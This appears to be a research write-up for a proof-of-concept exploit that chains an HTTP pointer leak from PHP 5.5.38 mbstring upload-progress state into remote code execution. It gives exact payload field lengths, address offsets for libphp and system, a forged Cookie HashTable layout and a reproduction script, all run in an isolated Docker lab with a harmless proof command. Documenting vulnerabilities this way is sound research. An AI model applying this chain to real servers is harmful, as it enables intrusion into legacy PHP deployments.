# PHP 5.5.38 mbstring reflection to HTTP-only RCE

## Result

The pinned PHP 5.5.38 Apache image reaches the fixed proof command
`id>/out/p` using addresses derived from an HTTP response.  Three fresh
containers with independent ASLR all produced the `www-data` uid/gid proof.
The final runner uses no `LD_PRELOAD`, debugger, `/proc/*/maps`, or
`/proc/*/mem`.

The sequence is:

1. one warm request and the 12 MiB upload-progress stale-state producer;
2. an mbstring POST-reflection request that returns a `libphp5.so` pointer;
3. a one-second wait while Apache replaces the faulted prefork child;
4. the 12 MiB terminal producer as the replacement child's first request;
5. the ZE2 fake-`HashTable` terminal consumer with `id>/out/p`.

## HTTP address disclosure

PHP 5.5 accepts the PHP 5.6 disclosure geometry without adjustment:

```text
field order                    900001 -> 900002 -> PHPSESSID -> progress
900001 value length            1048551
900002 value length            1041384
PHPSESSID value length         30
progress value / length        xyzxyzxy / 8
multipart boundary length      78
producer pads                  32
```

The minimal endpoint reads only
`$_POST['PHP_SESSION_UPLOAD_PROGRESS']`, writes its bytes as `PROGRESSHEX`,
and flushes.  A successful HTTP response contains a complete eight-byte
value even though the worker faults later during cleanup.

The exact image's `libphp5.so` contains:

```text
mbfl_encoding_ascii = libphp5.so + 0xc4bb20
mbfl_encoding_utf8  = libphp5.so + 0xc4cdc0
```

The final client interprets the response value as a little-endian address of
`mbfl_encoding_ascii`, then derives:

```text
libphp base = HTTP pointer - 0xc4bb20
system      = libphp base + 0x3a2b490
stale zval  = libphp base + 0x47d03c0
carrier     = libphp base + 0x47d0498
            = stale zval + 0xd8
```

Every derived libphp base in the final runs is page aligned.

This HTTP leak requires an application response sink equivalent to the bundled
`leak.php`: it must read the affected POST value and reflect its bytes before
the worker exits. The result is exact-build technical evidence, not a claim
that every PHP 5.5 application exposes the same response surface.

## Calibration and controls

Calibration is kept separate from the final evidence. The exact-image loader
layout places libc at `libphp+0x39ea000`; exact glibc exports `system` at
`+0x41490`, yielding `libphp+0x3a2b490`. Three earlier fresh terminal runs
independently gave the same libphp-relative stale and carrier offsets:
`+0x47d03c0` and `+0x47d0498`. Separate producer-omitted controls returned the
original marker bytes and no pointer. Raw calibration maps and traces are
deliberately omitted from this publication set.

The final chains below do not read the saved map or any process state.  Their
only runtime address input is the `PROGRESSHEX` HTTP body.

## Fresh-ASLR evidence

| Run | HTTP pointer | libphp base | `system` | stale zval | carrier | Proof |
| --- | --- | --- | --- | --- | --- | --- |
| `fresh-aslr-1` | `0x7d46af77eb20` | `0x7d46aeb33000` | `0x7d46b255e490` | `0x7d46b33033c0` | `0x7d46b3303498` | uid/gid 33 |
| `fresh-aslr-2` | `0x7a448e69cb20` | `0x7a448da51000` | `0x7a449147c490` | `0x7a44922213c0` | `0x7a4492221498` | uid/gid 33 |
| `fresh-aslr-3` | `0x749d4ddafb20` | `0x749d4d164000` | `0x749d50b8f490` | `0x749d519343c0` | `0x749d51934498` | uid/gid 33 |

Each run contains:

- `client/address-source.json`: raw HTTP value, symbol identity, formulas,
  computed addresses, statuses, and explicit instrumentation flags;
- `proof.txt`: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`;
- `target.inspect.json`: the exact target image, empty `PortBindings`, and no
  `LD_PRELOAD` environment entry;
- `network.inspect.json`: `Internal: true`;
- immutable target and attacker image inspection records.

## Terminal layout

The terminal consumer uses 40 Cookie pairs and puts the forged zval in pair
27.  Pair 28 supplies a 154-byte value at `R+0xd8`, containing a 72-byte ZE2
`HashTable`, a 72-byte `Bucket`, and `id>/out/p\0`.  The complete Cookie
header is 2,608 bytes.  The forged zval sets `refcount=1`, `type=IS_ARRAY`,
and clears the adjacent GC pointer so `_zval_ptr_dtor()` reaches
`zend_hash_destroy()`.  `HashTable.pDestructor=system`, and the single
bucket's `pData` points to the fixed command.

The terminal connection closes during synthetic-object cleanup after
`system` returns.  The proof file has already been written at that point.

## Exact runtime and isolation

- target image:
  `mirror.gcr.io/library/php@sha256:be7f9332d3bea49084d74a0718a5400f7b5d128c1937575e76f72df3a41e8eac`
- target image ID:
  `sha256:ea0a3d41ce6c99e1b96c335f3a9e616ecae62f1fabfdfdede51bb66b506d14ee`
- PHP / SAPI: PHP 5.5.38 / Apache 2 handler, NTS
- `libphp5.so` SHA-256:
  `8563f3735b5c513f5de12f8546c719a243e1f2d01af4f485e49e921b9c8278f6`
- `libphp5.so` build ID:
  `d72eb2913cab231f421f33f3667952fa9a8993ae`
- glibc 2.19 SHA-256:
  `27be5ec02827a61cdde3cb57b5a227dc1714d20ff739e2159eec8b8672f84490`
- glibc build ID:
  `2bba9d358bac63ff81597767b5bc229316bd12e0`
- glibc `system`: `libc+0x41490`

Every target uses a fresh Docker `--internal` network and has no published
ports.  The attacker container is read-only, has all capabilities dropped,
and can reach only the target on that network.  A fresh named volume holds
the fixed proof file.

## Reproduction

From this directory inside WSL/Linux:

```bash
./run-http-only.sh LABEL
```

The runner verifies both immutable image IDs, asserts PHP 5.5.38, asserts
empty Docker port bindings and absence of `LD_PRELOAD`, and requires the
uid/gid 33 proof before returning success.
